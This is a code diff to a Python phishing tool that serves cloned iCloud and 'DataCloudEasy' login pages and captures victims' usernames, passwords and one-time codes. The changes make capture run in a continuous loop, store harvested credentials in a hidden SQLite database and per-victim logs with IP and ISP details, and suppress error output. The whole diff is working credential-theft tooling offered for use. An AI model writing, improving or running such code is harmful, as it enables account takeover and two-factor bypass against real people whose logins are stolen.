@@ -167,11 +167,10 @@ def user_pass(data):
 
 def save_data(site, username, password, otp):
 	
-	os.chdir("..") 
-	os.chdir("..") 
+	db_path = os.path.join(BASE_DIR, "core", ".credentials.db")
 	try:
 		
-		conn = sqlite3.connect(".credentials.db")
+		conn = sqlite3.connect(db_path)
 		conn.execute("""
 		CREATE TABLE IF NOT EXISTS data (
 		id INTEGER PRIMARY KEY,
@@ -255,9 +254,8 @@ def save_aggregated_log(site, username, password, otp):
 				f.write("ISP       : {}\n".format(ip_info.get("isp", "")))
 			f.write("=" * 60 + "\n\n")
 		
-		print("\n\033[1;92mAggregated log saved to data/{}/aggregated.logs\033[0;0m".format(safe_email))
-	except Exception as error:
-		print("\033[1;91mFailed to save aggregated log: {}\033[0;0m".format(error))
+	except Exception:
+		pass
 
 
 def retrieve_data():
@@ -1025,9 +1023,8 @@ def work():
 			if (os.path.exists("log.txt") == True):
 				print("\r\033[1;92mCredentials found.            \033[0;0m")
 			
-	except:
-		stop()
-		sys.exit()
+	except KeyboardInterrupt:
+		raise
 
 
 	try:
@@ -1079,22 +1076,11 @@ def work_otp():
 		print("\033[1;92mOTP:\033[0;0m {}".format(otp_code))
 		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
 
-		print("")
-		print("\033[1;96m" + "=" * 50 + "\033[0;0m")
-		printf("CAPTURE SUMMARY", "INFO")
-		print("\033[1;96m" + "-" * 50 + "\033[0;0m")
-		if username:
-			print("  {}".format(username))
-		if password:
-			print("  {}".format(password))
-		print("  \033[1;92mOTP:\033[0;0m {}".format(otp_code))
-		print("\033[1;96m" + "=" * 50 + "\033[0;0m")
-
-	except:
-		stop()
-		sys.exit()
+	except KeyboardInterrupt:
+		raise
 
 	return username, password, otp_code
+
 
 
 def ip_data():
@@ -1103,42 +1089,6 @@ def ip_data():
 		line=ipfile.readline()
 		ipfile.close()
 		os.remove("ip.txt")
-		ip=line.replace("IP: ","",1)
-		ip=str(ip.strip())
-		url="http://ip-api.com/json/{}".format(ip)
-		data=requests.get(url).json()
-		status=data["status"].lower()
-		if (status=="success"):
-			colour = "\033[1;32m"
-		else:
-			colour = "\033[1;31m"
-		print("\n{}IP STATUS {}\033[0;0m".format(colour,status.upper()))
-	except:
-		pass
-	try:
-		if (status=="success"):
-			action=input("\nSee more credentials (Y/N): ").lower()
-			print("")
-			if(action=="y"):
-				print("\033[1;92mIP:\033[0;0m",data["query"])
-				print("\033[1;92mCountry:\033[0;0m",data["country"])
-				print("\033[1;92mCountry code:\033[0;0m",data["countryCode"])
-				print("\033[1;92mCity:\033[0;0m",data["city"])
-				print("\033[1;92mRegion:\033[0;0m",data["region"])
-				print("\033[1;92mRegion name:\033[0;0m",data["regionName"])
-				print("\033[1;92mZip:\033[0;0m",data["zip"])
-				
-				
-				print("\033[1;92mLocation:\033[0;0m {},{}".format(data["lat"], data["lon"]))
-				print("\033[1;92mTime zone:\033[0;0m",data["timezone"])
-				print("\033[1;92mISP:\033[0;0m", data["isp"])
-			elif(action=="n"):
-				pass
-		elif(status=="fail"):
-			pass
-		else:
-			pass
-		print("")
 	except:
 		pass
 	return None
@@ -1193,42 +1143,44 @@ def extract_data(log):
 
 
 if (option==1):
+	site = "iCloud"
+	available_tunnels()
+	os.chdir("core/sites/iCloud")
+	server("iCloud")
 	try:
-		site = "iCloud"
-		available_tunnels()
-		os.chdir("core/sites/iCloud")
-		server("iCloud")
-		username, password, otp = work_otp()
+		while True:
+			username, password, otp = work_otp()
+			save_aggregated_log(site, username, password, otp)
+			ip_data()
+			save_data(site, username, password, otp)
+			for f in ["log.txt", "otp.txt", "email.txt"]:
+				try:
+					os.remove(f)
+				except:
+					pass
+	except KeyboardInterrupt:
+		print("\n\n\033[1;93mStopping service...\033[0;0m")
 		stop()
-		save_aggregated_log(site, username, password, otp)
-		ip_data()
-		try:
-				os.remove("log.txt")
-				os.remove("otp.txt")
-		except:
-			pass
-		save_data(site, username, password, otp)
-	except Exception as error:
-		print(error)
 
 elif (option==2):
+	site = "DataCloudEasy"
+	available_tunnels()
+	os.chdir("core/sites/DataCloudEasy")
+	server("DataCloudEasy")
 	try:
-		site = "DataCloudEasy"
-		available_tunnels()
-		os.chdir("core/sites/DataCloudEasy")
-		server("DataCloudEasy")
-		username, password, otp = work_otp()
+		while True:
+			username, password, otp = work_otp()
+			save_aggregated_log(site, username, password, otp)
+			ip_data()
+			save_data(site, username, password, otp)
+			for f in ["log.txt", "otp.txt", "email.txt"]:
+				try:
+					os.remove(f)
+				except:
+					pass
+	except KeyboardInterrupt:
+		print("\n\n\033[1;93mStopping service...\033[0;0m")
 		stop()
-		save_aggregated_log(site, username, password, otp)
-		ip_data()
-		try:
-				os.remove("log.txt")
-				os.remove("otp.txt")
-		except:
-			pass
-		save_data(site, username, password, otp)
-	except Exception as error:
-		print(error)
 
 
 elif (option==0):
